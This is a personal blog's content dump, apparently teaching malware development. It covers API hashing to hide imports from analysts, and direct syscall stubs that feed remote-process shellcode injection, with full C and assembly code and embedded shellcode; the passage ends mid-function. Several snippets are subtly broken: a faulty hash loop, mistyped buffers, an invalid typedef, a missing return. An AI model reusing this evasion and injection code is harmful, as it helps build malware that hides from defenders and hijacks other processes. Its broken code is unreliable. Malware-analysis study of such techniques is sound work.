{"/about/":{"data":{"":"\nHello there, and welcome to my blog! üëã\nI‚Äôm Berkay, but most people know me as bekoo. I‚Äôm 19 years old and have dedicated the past 4 years of my life to cybersecurity research. My main focus areas are:\nüîç Reverse Engineering\nüêõ Malware Analysis\n‚öôÔ∏è Malware Development\nI publish my blogs and documents in both Turkish and English. While there‚Äôs already a lot of content in English, I‚Äôve noticed the lack of quality Turkish resources. That‚Äôs why I make sure to create clear and detailed Turkish content alongside my English work.\nüìå Important note: None of the content here is intended for illegal purposes, nor does it encourage any kind of illegal activity. If you apply the techniques or concepts from here in real-world scenarios, you are solely responsible for your actions. My only goal is to provide resources for those who are learning and researching.\nI hope my content is helpful to you. If you have any questions, notice any mistakes, or just want to have a conversation, feel free to reach out. Answering your questions, correcting my mistakes, and learning together is something I truly value.\nHappy reading and good luck with your research! üöÄ"},"title":"About"},"/blog/":{"data":{"":"\rRSS Feed "},"title":"Blogs"},"/docs/":{"data":{"":"On this site, documents are shared in three categories:\nMalware Development\rWindows Kernel Development\rUEFI Development"},"title":"Documentation"},"/docs/malware-dev/":{"data":{"":"You can check the following sections to review documentations related to Malware Development:\nMalware Resurrection\rFile Spoofing\rAPI Hashing\rDirect Syscalls\rNTAPI Injection\rDLL Injection\rShellcode Injection"},"title":"Malware Development"},"/docs/malware-dev/api-hashing/":{"data":{"":"","#":"In this documentation, we will discuss API Hashing technique.\nWhat is Portable Executable? First of all, I think it is necessary to understand the PE (Portable Executable) structure because this technique is all about this structure.\nPE is a file format for executable files, object codes, DLLs and others used in 32 and 64 bit versions of Windows operating systems and UEFI environments. PE contains the data structures needed for the Windows OS loader to manage the code to be executed.\nA PE file consists of a set of headers and sections that tell the dynamic linker how to map the executable file into file memory and execute it. These headers and sections allow the operating system to load and run the file correctly.\nSome important headers in the PE structure are as follows:\nDOS Header (IMAGE_DOS_HEADER): This header contains the minimum information necessary for the executable to be recognized by older MS-DOS operating systems. DOS Stub: This contains the minimum information required for an executable file to be recognized by the DOS operating system. This is used to determine whether the file is executable or not. PE Header (IMAGE_NT_HEADERS): This header contains important information specific to the PE format. It contains the file size, entry point address, optional DLLs and other information necessary for the operating system to load and run the file correctly. File Header (IMAGE_FILE_HEADER): This header contains general information about the file. The file‚Äôs architecture, file type, partitions and other information can be found here. Optional Header (IMAGE_OPTIONAL_HEADER): This header contains the information needed to load and run the file. The file‚Äôs architecture, file type, partitions and other information can be found here. What are EAT and IAT? EAT (Export Address Table) and IAT (Import Address Table) are two important tables found in PE files. These tables contain the addresses and names of functions used by the operating system during file execution.\nEAT (Export Address Table): EAT is a table containing the addresses and names of the functions that a PE file exports. This table helps the dynamic linker to determine which functions can be used when loading and running the executable. Keep this in mind especially because we will operate on this table in the future. IAT (Import Address Table): IAT is a table containing the addresses and names of functions that a PE file imports from other PE files. This table also helps the dynamic linker to determine which functions should be imported when loading and running the executable. What is API Hashing? API Hashing is a technique that converts the name or other identifying characteristics of an API function into a hash value. This hash value is used to represent the identity of the function. It can be used to hide the names and addresses of APIs.\nFor example, let‚Äôs say we compile and run a project that includes the MessageBoxA function. Since we are using MessageBoxA in our project, during compilation the compiler will add the address of the MessageBoxA API to the Import Address Table (IAT). This means that when we run the program, the MessageBoxA API will be accessible from this address.\nHowever, what can we do if we want to hide the address of MessageBoxA? This is where API hashing comes in. A person analyzing the malware can easily see the APIs used in the malware in the IAT. Therefore, if we give different names to these APIs in our project and then hash these different names and add them to the IAT, the analyst cannot easily see these APIs. Basically, this is the API hashing method: Hiding the relevant API by renaming and hashing it and then adding it to the IAT table.\n#include \u003cstdio.h\u003e #include \u003cWindows.h\u003e DWORD CalculateHash(char* data) { DWORD hash = 0x99; for (size_t i = 0; i \u003c sizeof(data); i++) { hash += (hash * 0xab10f29f + data[i]) \u0026 0xffffff; } return hash; } int main() { DWORD hash_value = CalculateHash(\"CreateThread\"); printf(\"CreateThread: 0x%00x\\n\", hash_value); getchar(); return 0; } The above example is a simple piece of code that calculates the hash value of a given API. First, the name of the API is taken and sent to the CalculateHash function to calculate it.\nInside the function, we created a DWORD variable named hash and holding a value of 0x99. We used this value as the starting point of the calculation.\nWe then started a loop. In this loop, the current hash value is multiplied by the constant value 0xab10f29f. This helps to increase the contribution of each character to the hash value. The value of the current character is added to the multiplied value. Finally, the result is bitwise AND with the value 0xffffff. This ensures that the hash value remains a 32-bit integer. This is a simple project and we will use this function in the future.\nFinding the Base Address Now, we will move on to finding the address of the API. Step by step, using WinDbg, we will learn how to sort the process modules and APIs and how to see the PE (Portable Executable) structure. Then, we will apply this information to the C project.\nFirst, we will examine the PEB structure of a running process, looking at the base addresses of the modules of the process. Specifically, a PEB is a structure that contains the runtime information of a process. It contains the base addresses of the process‚Äôs modules, heap and stack information, environmental variables and other information.\nIn 64-bit processes, the PEB is located at offset 0x60 from the Thread Environment Block block. TEB is a structure containing runtime information of the executing thread. The TEB structure is marked by the GS segment register. Therefore, the PEB structure can be accessed through the GS segment register at GS:0x60.\nNow, let‚Äôs run cmd.exe and start the analysis using WinDbg:\nFirst, we can start by examining the structure of TEB with the dt command:\nThe important section is +0x060 ProcessEnvironmentBlock : 0x000000fc4bacf000 PEB. We mentioned TEB and PEB above and here we see the address of PEB in TEB. Now let‚Äôs take a look at this structure with the address of this PEB:\nThus we have seen the PEB structure of the closely related process. The part that interests us here is +0x018 Ldr: 0x00007ffec5c153e0 PEB_LDR_DATA. This structure contains the list of loaded modules. Let‚Äôs take a look at this structure:\nWhen we take a look at this structure, we see that there are three different lists. These lists represent the list of loaded modules. The structures inside these lists belong to the LDR_DATA_TABLE_ENTRY structure. This structure contains the information of the loaded module.\nBefore recognizing these lists, we need to understand the LIST_ENTRY structure:\nFlink The next structure that points to the corresponding structure. Blink: The previous structure pointing to the related structure. Now let‚Äôs get to know the lists:\nInLoadOrderModuleList: Represents the order in which modules are loaded.\nInMemoryOrderModuleList: Represents the order in which modules are loaded into memory.\nInInitializationOrderModuleList: Represents the initialization order of the modules.\nOur main focus will be on the InLoaderOrderModuleList. We mentioned that this list represents the order in which the modules are loaded. Now we are going to operate on this list and browse the loaded modules one by one.\nFirst, the address 0x000002c0f1e23690 in the InLoadOrderModuleList structure is the address of the first loaded module. Using this address we can browse the first loaded module:\nWe can see the detailed information of the first loaded module up close as can be seen in the photo. We can also see that the first loaded module is the module of the executable file with the name cmd.exe. Dllbase contains the base address of the module. BaseDllName is the name of the loaded module.\nWe can move on to the next loaded module to continue the research:\nWe see that the other loaded module is ntdll.dll. In this way we can examine all the installed modules one by one. Finally, let‚Äôs take a look at the other module:\nWhen we take a look at the other loaded module, we see that it is kernel32.dll. Now we will turn our focus to our C project. We will pour what we have learned into the C project.\nSince these structures are not defined in the IDE, we need to complete them manually. Now we can move on to coding:\n#include \"utils.h\" DWORD CalculateHash(char* data) { DWORD hash = 0x99; for (size_t i = 0; i \u003c sizeof(data); i++) { hash += (hash * 0xab10f29f + data[i]) \u0026 0xffffff; } return hash; } DWORD CalcModuleHash(LDR_MODULE* ModuleLink) { char* ModuleName[64]; size_t counter = 0x0; while (ModuleLink-\u003eBaseDllName.Buffer[counter] \u0026\u0026 counter \u003c sizeof(ModuleName) - 1) { ModuleName[counter] = (char)ModuleLink-\u003eBaseDllName.Buffer[counter]; counter++; } ModuleName[counter++] = 0; return CalculateHash((char*)CharLowerA(ModuleName)); } HMODULE GetModuleBaseAddress(DWORD Hash) { HMODULE ModuleBaseAddress = NULL; INT_PTR PEB\t= __readgsqword(0x60);\tINT_PTR FlinkOffset\t= 0x10;\tINT_PTR PEB_LDR_DATA = *(INT_PTR*)(PEB + LDR); INT_PTR FirstFlink = *(INT_PTR*)(PEB_LDR_DATA + FlinkOffset); LDR_MODULE* LDR_DATA_TABLE_ENTRY = (LDR_MODULE*)FirstFlink; do { LDR_DATA_TABLE_ENTRY = (LDR_MODULE*)LDR_DATA_TABLE_ENTRY-\u003eInLoadOrderModuleList.Flink; if (LDR_DATA_TABLE_ENTRY-\u003eBaseAddress != NULL) { if (CalcModuleHash(LDR_DATA_TABLE_ENTRY) == Hash) { break; } } } while (FirstFlink != (INT_PTR)LDR_DATA_TABLE_ENTRY); ModuleBaseAddress = (HMODULE)LDR_DATA_TABLE_ENTRY-\u003eBaseAddress; return ModuleBaseAddress; } In this code, first the hash value of the API is calculated with the CalculateHash function. Then the CalcModuleHash function takes the name of a module and calculates its hash value. In the process, the module name is converted to lower case and a new hash value is calculated using the ASCII value of each character and the previous hash value.\nFinally, the GetModuleBaseAddress function finds a module that matches a given hash value and returns its base address. For this, the process loops over the loaded module list and checks the hash value of each module by calculating it with CalcModuleHash. If a match is found, the starting address of the corresponding module is returned.\nBut we don‚Äôt need to use this piece of code. There are already APIs that do this.\nFinding the API‚Äôs Address After finding the Base Address, we need to find the address of the API. What we need for this is the IMAGE_EXPORT_DIRECTORY structure. This structure contains the address of the Export Address Table (EAT). Here are some of the important fields contained in this structure:\nNumberOfFunctions: Number of exported functions AddressOfFunctions: Address of the table with the addresses of the exported functions AddressOfNames: Address of the table with the names of the exported functions Let‚Äôs go back to Windbg and start by finding the EAT table of ntdll:\nWe can see that the address where the ntdll is installed is 00007ffec5a90000. Now let‚Äôs access the IMAGE_DOS_HEADER structure from this address:\nAfter finding the address of the IMAGE_DOS_HEADER structure, we will reach the IMAGE_NT_HEADERS structure.\nTo find the address of this structure, we can obtain the hex value of e_lfanew of the IMAGE_DOS_HEADER structure by adding it to the address of ntdll. Thus we can reach the IMAGE_NT_HEADERS structure:\nThen we will access IMAGE_OPTIONAL_HEADER64‚Äôa (0x18):\n0:004\u003e dt _IMAGE_OPTIONAL_HEADER64 00007ffe`c5a90000+0xe0+0x18 ntdll!_IMAGE_OPTIONAL_HEADER64 +0x000 Magic : 0x20b +0x002 MajorLinkerVersion : 0xe '' +0x003 MinorLinkerVersion : 0x1e '' +0x004 SizeOfCode : 0x130000 +0x008 SizeOfInitializedData : 0xe5000 +0x00c SizeOfUninitializedData : 0 +0x010 AddressOfEntryPoint : 0 +0x014 BaseOfCode : 0x1000 +0x018 ImageBase : 0x00007ff9`373b0000 +0x020 SectionAlignment : 0x1000 +0x024 FileAlignment : 0x1000 +0x028 MajorOperatingSystemVersion : 0xa +0x02a MinorOperatingSystemVersion : 0 +0x02c MajorImageVersion : 0xa +0x02e MinorImageVersion : 0 +0x030 MajorSubsystemVersion : 0xa +0x032 MinorSubsystemVersion : 0 +0x034 Win32VersionValue : 0 +0x038 SizeOfImage : 0x216000 +0x03c SizeOfHeaders : 0x1000 +0x040 CheckSum : 0x21eed5 +0x044 Subsystem : 3 +0x046 DllCharacteristics : 0x4160 +0x048 SizeOfStackReserve : 0x40000 +0x050 SizeOfStackCommit : 0x1000 +0x058 SizeOfHeapReserve : 0x100000 +0x060 SizeOfHeapCommit : 0x1000 +0x068 LoaderFlags : 0 +0x06c NumberOfRvaAndSizes : 0x10 +0x070 DataDirectory : [16] _IMAGE_DATA_DIRECTORY The important offset is0x70, the IMAGE_DATA_DIRECTORY structure. This structure holds important information for the Import Address Table, such as the RVA (Relative Virtual Address) of the Export Address Table.\nThe IMAGE_EXPORT_DIRECTORY structure is as follows:\ntypedef struct _IMAGE_EXPORT_DIRECTORY { DWORD Characteristics; DWORD TimeDateStamp; WORD MajorVersion; WORD MinorVersion; DWORD Name; DWORD Base; DWORD NumberOfFunctions; DWORD NumberOfNames; DWORD AddressOfFunctions; // RVA from base of image DWORD AddressOfNames; // RVA from base of image DWORD AddressOfNameOrdinals; // RVA from base of image } IMAGE_EXPORT_DIRECTORY, * PIMAGE_EXPORT_DIRECTORY; Now, let‚Äôs add the following code to our C project to find the address of the API:\nPDWORD getFunctionAddressByHash(char* library, DWORD hash) { PDWORD functionAddress = (PDWORD)0; HMODULE libraryBase = LoadLibraryA(library); PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)libraryBase; PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)libraryBase + dosHeader-\u003ee_lfanew); DWORD_PTR exportDirectoryRVA = imageNTHeaders-\u003eOptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress; PIMAGE_EXPORT_DIRECTORY imageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)libraryBase + exportDirectoryRVA); // Export edilmi≈ü fonksiyonlarla ilgili bilgiler i√ßin RVA'larƒ± al PDWORD addresOfFunctionsRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory-\u003eAddressOfFunctions); PDWORD addressOfNamesRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory-\u003eAddressOfNames); PWORD addressOfNameOrdinalsRVA = (PWORD)((DWORD_PTR)libraryBase + imageExportDirectory-\u003eAddressOfNameOrdinals); for (DWORD i = 0; i \u003c imageExportDirectory-\u003eNumberOfFunctions; i++) { DWORD functionNameRVA = addressOfNamesRVA[i]; DWORD_PTR functionNameVA = (DWORD_PTR)libraryBase + functionNameRVA; char* functionName = (char*)functionNameVA; DWORD_PTR functionAddressRVA = 0; // Alƒ±nan Export fonksiyonun hash deƒüerini hesapla DWORD functionNameHash = getHashFromString(functionName); // CreateThread bulunursa Adresini ekrana bastƒ±r ve main'e d√∂n if (functionNameHash == hash) { functionAddressRVA = addresOfFunctionsRVA[addressOfNameOrdinalsRVA[i]]; functionAddress = (PDWORD)((DWORD_PTR)libraryBase + functionAddressRVA); printf(\"%s : 0x%x : %p\\n\", functionName, functionNameHash, functionAddress); return functionAddress; } } } In the code, the getFunctionAddressByHash function finds and returns the address of an API that matches a given hash value. To do this, it loads the given library name and gets the address of the Export Address Table using the IMAGE_EXPORT_DIRECTORY structure.\nThen, using the addresses in this structure, the addresses of the table containing the addresses of the exported functions and the table containing the names are retrieved. It then loops over these tables and calculates the name and hash value of each function. When a match is found, the address of the corresponding function is returned.\nFull code:\n#include \u003cstdio.h\u003e #include \u003cstring.h\u003e #include \u003cWindows.h\u003e typedef struct HANDLE(NTAPI* MyCreateThread)( LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId ); DWORD getHashFromString(char* string) { size_t stringLength = strnlen_s(string, 50); DWORD hash = 0x35; for (size_t i = 0; i \u003c stringLength; i++) { hash += (hash * 0xab10f29f + string[i]) \u0026 0xffffff; } return hash; } PDWORD getFunctionAddressByHash(char* library, DWORD hash) { PDWORD functionAddress = (PDWORD)0; HMODULE libraryBase = LoadLibraryA(library); PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)libraryBase; PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)libraryBase + dosHeader-\u003ee_lfanew); DWORD_PTR exportDirectoryRVA = imageNTHeaders-\u003eOptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress; PIMAGE_EXPORT_DIRECTORY imageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)libraryBase + exportDirectoryRVA); // Export edilmi≈ü fonksiyonlarla ilgili bilgiler i√ßin RVA'larƒ± al PDWORD addresOfFunctionsRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory-\u003eAddressOfFunctions); PDWORD addressOfNamesRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory-\u003eAddressOfNames); PWORD addressOfNameOrdinalsRVA = (PWORD)((DWORD_PTR)libraryBase + imageExportDirectory-\u003eAddressOfNameOrdinals); for (DWORD i = 0; i \u003c imageExportDirectory-\u003eNumberOfFunctions; i++) { DWORD functionNameRVA = addressOfNamesRVA[i]; DWORD_PTR functionNameVA = (DWORD_PTR)libraryBase + functionNameRVA; char* functionName = (char*)functionNameVA; DWORD_PTR functionAddressRVA = 0; // Alƒ±nan Export fonksiyonun hash deƒüerini hesapla DWORD functionNameHash = getHashFromString(functionName); // CreateThread bulunursa Adresini ekrana bastƒ±r ve main'e d√∂n if (functionNameHash == hash) { functionAddressRVA = addresOfFunctionsRVA[addressOfNameOrdinalsRVA[i]]; functionAddress = (PDWORD)((DWORD_PTR)libraryBase + functionAddressRVA); printf(\"%s : 0x%x : %p\\n\", functionName, functionNameHash, functionAddress); return functionAddress; } } } int main() { DWORD hash = getHashFromString(\"CreateThread\"); PDWORD functionAddress = getFunctionAddressByHash((char*)\"kernel32\", hash); DWORD TID = 0; HANDLE th = CreateThread(NULL, 0, NULL, NULL, 0, \u0026TID); if (th == NULL) { printf(\"Failed to create thread\\n\"); return -1; } printf(\"Thread created successfully\\n\"); CloseHandle(th); return 0; } When we look at the result, we see that the API was successfully executed:\nReferences EN Wikipedia - Portable Executable Tech Zealots - A Comprehensive Guide To PE Structure, The Layman‚Äôs Way Red Team Notes - Windows API Hashing in Malware Cognisys Labs - Combining Indirect Dynamic Syscalls and API Hashing "},"title":"API Hashing"},"/docs/malware-dev/direct-syscalls/":{"data":{"":"","#":"In this documentation we will see Direct Systemcalls technique.\nWhat is System Call? Warning\nIt is assumed that the reader is familiar with the NTAPI mechanism described in the NTAPI Injection documentation and the basic differences between user-mode and kernel-mode.\nA system call is a programmatic way for a program to request a service from the operating system. More simply, it is a command that allows a program running in user mode to switch to kernel mode. In operating systems such as Windows, a program running in user mode accesses the kernel-mode services of the operating system by making a system call. This transition occurs when the CPU switches to kernel mode, which is managed by the operating system.\nWhen it comes to the Windows API, a system call is a command that provides a temporary transition (CPU switch) from user-mode to kernel-mode for the execution of the WIN32 API called by a user-mode program.\nLet‚Äôs walk through the diagram for a better understanding:\nIf you‚Äôve read the NTAPI Injection documentation, you‚Äôll recognize this diagram.\nLet‚Äôs say we call OpenProcess API from user-mode program. Since the original addresses of these APIs are kept in ntoskrnl.exe from kernel space, they need to be redirected from user-mode to kernel-mode. The first stop of this API will be OpenProcess from kernel32.dll and then it will go to the last stop of user-mode, ntdll.dll library and become NtOpenProcess. This is where the relevant SYSCALL comes into play. After ntdll.dll, it needs to be redirected to the kernel-mode domain as the steps will continue from the kernel space.\nAfter the SYSCALL is executed, the kernel-mode is switched to kernel-mode and redirected to the SSDT table, the original address of NtOpenProcess is calculated and redirected to the address from ntoskrnl.exe. If you want to learn more about the SSDT table, you can check my SSDT documentation.\nEach NTAPI has a syscall number to identify which API is being executed. These numbers can vary depending on the operating system version and are usually defined at the kernel level. This identifies which API the program wants to run. For example, with Windbg we can look up the syscall number of NtOpenProcess from ntdll.dll:\nWhen a syscall is processing, ssn -the syscall number- is transferred to eax. In the photo we can see that the value transferred to eax is 0x26 for NtOpenProcess.\nDirect Syscall Technique The Direct Systemcall technique, as the name suggests, is a technique that involves making syscalls directly from user-mode programs. This method makes a direct syscall without going to any libraries in between (kernel32.dll etc. as we can see from the diagram).\nCoding of Assembly Project If you remember, in NTAPI Injection we were defining the structure to run NtOpenProcess. With this method we will create an .asm file in the project. The reason for this is that syscalls are made in assembly, that is, at a lower level. Therefore, we cannot make syscalls directly with C codes.\nRight click on the project we created in Visual Studio and click on Build Dependencies \u003e Build Customizations:\nThen let‚Äôs create an .asm project and right click on the created project and select Properties:\nAfter clicking Properties, let‚Äôs check the Excluded From Build option as No.\nThen let‚Äôs code the assembly file we created:\n.code My_NtOpenProcess proc mov r10,rcx mov eax,26h syscall ret My_NtOpenProcess endp end As you can see in this code, we syscall with 0x26 ssn. When we call the My_NtOpenProcess function in our C project, the flow will be transferred here.\nCoding of C Project Here‚Äôs the code for main.h:\n#include \u003cstdio.h\u003e #include \u003cWindows.h\u003e #define STATUS_SUCCESS (NTSTATUS)0x00000000L typedef struct _UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWSTR Buffer; } UNICODE_STRING, * PUNICODE_STRING; typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor; PVOID SecurityQualityOfService; } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES; typedef struct _CLIENT_ID { HANDLE UniqueProcess; HANDLE UniqueThread; } CLIENT_ID, * PCLIENT_ID; extern NTSTATUS My_NtOpenProcess( PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId ); Now we know what these structures are used for. Notice that with extern we define My_NtOpenProcess, which we created in the assembly project.\nmain.c:\n#include \"main.h\" int main(int argc, char* argv[]) { if (argc \u003c 2) { printf(\"Usage: .\\\\program \u003cPID\u003e\\n\"); return 1; } DWORD PID = atoi(argv[1]); HANDLE HandleProcess = NULL; CLIENT_ID CID = { (HANDLE)PID, NULL }; OBJECT_ATTRIBUTES ObjAttr = { sizeof(ObjAttr), NULL }; NTSTATUS Status = My_NtOpenProcess(\u0026HandleProcess, PROCESS_ALL_ACCESS, \u0026ObjAttr, \u0026CID); if (Status != STATUS_SUCCESS) { printf(\"NtOpenProcess failed with status: 0x%08x\\n\", Status); return -1; } printf(\"HandleProcess: 0x%p\\n\", HandleProcess); return 0; } Let‚Äôs run the program and take a look at the results:\nAs you can see, NtOpenProcess is running successfully. Still, we can use Windbg to get a closer look at what‚Äôs going on in the background:\nLet‚Äôs add a bp in the part where we call My_NtOpenProcess from the main function and see what it does step by step:\nAs you can see, the flow transferring to the function of the asm project.\nWe can create a diagram of the step we are doing so that we can understand it better:\nRunning Shellcode with Direct Systemcall Update the assembly project with these codes:\n.data extern NtOpenProcessSSN:DWORD extern NtAllocateVirtualMemorySSN:DWORD extern NtWriteVirtualMemorySSN:DWORD extern NtCreateThreadExSSN:DWORD extern NtWaitForSingleObjectSSN:DWORD extern NtCloseSSN:DWORD .code My_NtOpenProcess PROC mov r10, rcx mov eax, NtOpenProcessSSN syscall ret My_NtOpenProcess ENDP My_NtAllocateVirtualMemory PROC mov r10, rcx mov eax, NtAllocateVirtualMemorySSN syscall ret My_NtAllocateVirtualMemory ENDP My_NtWriteVirtualMemory PROC mov r10, rcx mov eax, NtWriteVirtualMemorySSN syscall ret My_NtWriteVirtualMemory ENDP My_NtCreateThreadEx PROC mov r10, rcx mov eax, NtCreateThreadExSSN syscall ret My_NtCreateThreadEx ENDP My_NtWaitForSingleObject PROC mov r10, rcx mov eax, NtWaitForSingleObjectSSN syscall ret My_NtWaitForSingleObject ENDP END Then update the main.h header file:\n#include \u003cstdio.h\u003e #include \u003cWindows.h\u003e #define STATUS_SUCCESS (NTSTATUS)0x00000000L DWORD NtOpenProcessSSN; DWORD NtAllocateVirtualMemorySSN; DWORD NtWriteVirtualMemorySSN; DWORD NtCreateThreadExSSN; DWORD NtWaitForSingleObjectSSN; DWORD NtCloseSSN; #pragma region STRUCTURES typedef struct _PS_ATTRIBUTE { ULONG Attribute; SIZE_T Size; union { ULONG Value; PVOID ValuePtr; } u1; PSIZE_T ReturnLength; } PS_ATTRIBUTE, * PPS_ATTRIBUTE; typedef struct _UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWSTR Buffer; } UNICODE_STRING, * PUNICODE_STRING; typedef struct _OBJECT_ATTRIBUTES { ULONG Length; HANDLE RootDirectory; PUNICODE_STRING ObjectName; ULONG Attributes; PVOID SecurityDescriptor; PVOID SecurityQualityOfService; } OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES; typedef struct _CLIENT_ID { HANDLE UniqueProcess; HANDLE UniqueThread; } CLIENT_ID, * PCLIENT_ID; typedef struct _PS_ATTRIBUTE_LIST { SIZE_T TotalLength; PS_ATTRIBUTE Attributes[1]; } PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST; #pragma endregion extern NTSTATUS My_NtOpenProcess( OUT PHANDLE ProcessHandle, IN ACCESS_MASK DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes, IN PCLIENT_ID ClientId OPTIONAL ); extern NTSTATUS My_NtAllocateVirtualMemory( IN HANDLE ProcessHandle, IN OUT PVOID* BaseAddress, IN ULONG ZeroBits, IN OUT PSIZE_T RegionSize, IN ULONG AllocationType, IN ULONG Protect ); extern NTSTATUS My_NtWriteVirtualMemory( IN HANDLE ProcessHandle, IN PVOID BaseAddress, IN PVOID Buffer, IN SIZE_T NumberOfBytesToWrite, OUT PSIZE_T NumberOfBytesWritten OPTIONAL ); extern NTSTATUS My_NtCreateThreadEx( OUT PHANDLE ThreadHandle, IN ACCESS_MASK DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL, IN HANDLE ProcessHandle, IN PVOID StartRoutine, IN PVOID Argument OPTIONAL, IN ULONG CreateFlags, IN SIZE_T ZeroBits, IN SIZE_T StackSize, IN SIZE_T MaximumStackSize, IN PPS_ATTRIBUTE_LIST AttributeList OPTIONAL ); extern NTSTATUS My_NtWaitForSingleObject( _In_ HANDLE Handle, _In_ BOOLEAN Alertable, _In_opt_ PLARGE_INTEGER Timeout ); And main.c:\n#include \"main.h\" char Shellcode[] = \"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\" \"\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\" \"\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\" \"\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\" \"\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\" \"\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\" \"\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\" \"\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\" \"\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\" \"\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\" \"\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\" \"\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\" \"\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\" \"\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\" \"\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x48\\xba\\x01\\x00\\x00\\x00\\x00\" \"\\x00\\x00\\x00\\x48\\x8d\\x8d\\x01\\x01\\x00\\x00\\x41\\xba\\x31\\x8b\" \"\\x6f\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x41\\xba\\xa6\\x95\\xbd\" \"\\x9d\\xff\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\" \"\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\" \"\\xd5\\x63\\x6d\\x64\\x2e\\x65\\x78\\x65\\x20\\x2f\\x4b\\x20\\x22\\x65\" \"\\x63\\x68\\x6f\\x20\\x44\\x69\\x72\\x65\\x63\\x74\\x20\\x53\\x79\\x73\" \"\\x74\\x65\\x6d\\x63\\x61\\x6c\\x6c\\x73\\x20\\x77\\x69\\x74\\x68\\x20\" \"\\x62\\x65\\x6b\\x6f\\x6f\\x22\"; size_t ShellcodeSize = sizeof(Shellcode); DWORD GetSSN(HMODULE ModuleName, LPCSTR ProcName) { printf(\"\\n***** %s *****\\n\", ProcName); DWORD sysCallNumber = 0; UINT_PTR targetNtFunction; targetNtFunction = (UINT_PTR)GetProcAddress(ModuleName, ProcName); if (targetNtFunction == 0) { printf(\"%s handle retrieval failed Error Code: 0x%lx\\n\", ProcName, GetLastError()); return -1; } sysCallNumber = ((PBYTE)(targetNtFunction + 0x4))[0]; printf(\"SSN number for the %s successfully received! 0x%lx\\n\", ProcName, sysCallNumber); return sysCallNumber; } int main(int argc, char* argv[]) { if (argc \u003c 2) { printf(\"Usage: .\\\\program \u003cPID\u003e\\n\"); return 1; } DWORD PID = atoi(argv[1]); HANDLE HandleProcess = NULL; HANDLE HandleThread = NULL; PVOID RemoteBuffer = NULL; HMODULE NTDLLAddress = GetModuleHandleW(L\"ntdll.dll\"); CLIENT_ID CID = { (HANDLE)PID, NULL }; OBJECT_ATTRIBUTES ObjAttr = { sizeof(ObjAttr), NULL }; NTSTATUS Status = STATUS_SUCCESS; NtOpenProcessSSN = GetSSN(NTDLLAddress, \"NtOpenProcess\"); Status = My_NtOpenProcess(\u0026HandleProcess, PROCESS_ALL_ACCESS, \u0026ObjAttr, \u0026CID); if (Status != STATUS_SUCCESS) { printf(\"NtOpenProcess failed! Error Code: 0x%lx\\n\", Status); CloseHandle(HandleProcess); return 1; } NtAllocateVirtualMemorySSN = GetSSN(NTDLLAddress, \"NtAllocateVirtualMemory\"); Status = My_NtAllocateVirtualMemory(HandleProcess, \u0026RemoteBuffer, 0, \u0026ShellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (Status != STATUS_SUCCESS) { printf(\"NtAllocateVirtualMemory failed! Error Code: 0x%lx\\n\", Status); CloseHandle(HandleProcess); return 1; } 